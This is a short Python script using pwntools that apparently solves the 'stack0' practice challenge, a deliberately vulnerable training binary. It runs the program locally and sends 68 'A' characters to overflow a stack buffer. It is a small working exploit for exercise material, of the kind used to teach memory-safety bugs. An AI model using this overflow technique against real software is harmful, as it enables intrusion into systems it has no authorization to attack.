from pwn import *

context.log_level = 'error'

p = process('./stack0')

p.sendline('A' * (17*4))
print(p.recvline().decode('ascii'))
